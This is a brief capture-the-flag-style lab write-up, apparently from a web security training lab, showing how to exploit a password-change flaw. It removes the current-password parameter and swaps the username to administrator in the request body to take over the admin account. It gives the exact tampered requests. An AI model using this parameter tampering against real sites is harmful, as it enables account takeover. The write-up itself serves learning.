1) login as wiener:peter

2) change the password to peter1

3) look at the request used to change the password 

4) csrf=sMhNGi0yfjLTi5tSHFiXfJPFuPo1268w&username=wiener&current-password=peter&new-password-1=peter1&new-password-2=peter1
    try to remove now current-password and change another time the password
    csrf=sMhNGi0yfjLTi5tSHFiXfJPFuPo1268w&username=wiener&new-password-1=peter2&new-password-2=peter2

5) we cna notice that also this works, so now we try to change the admin password without knowing it 
    csrf=sMhNGi0yfjLTi5tSHFiXfJPFuPo1268w&username=administrator&new-password-1=peter2&new-password-2=peter2

6) now we can access as administrator:peter2
